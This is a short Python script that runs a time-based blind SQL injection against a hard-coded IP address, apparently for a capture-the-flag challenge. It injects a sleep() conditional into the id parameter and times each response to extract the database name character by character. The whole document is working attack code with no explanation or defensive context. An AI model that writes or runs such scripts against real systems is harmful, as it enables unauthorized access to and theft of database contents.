import requests 
import string
import time
s = string.printable
flag=''
url="http://122.51.52.109:6007/time/"
for i in range(1,40):
    # for j in s:
    for j in range(32,127):
        u=url+f"?id=if(ascii(substr(database(),{i},1))={j},sleep(3),0)"
        t1 =time.time()
        r = requests.get(u)
        t2 = time.time()
        if t2-t1>3:
            # flag+=j
            flag+=chr(j)
            print(flag)
            break
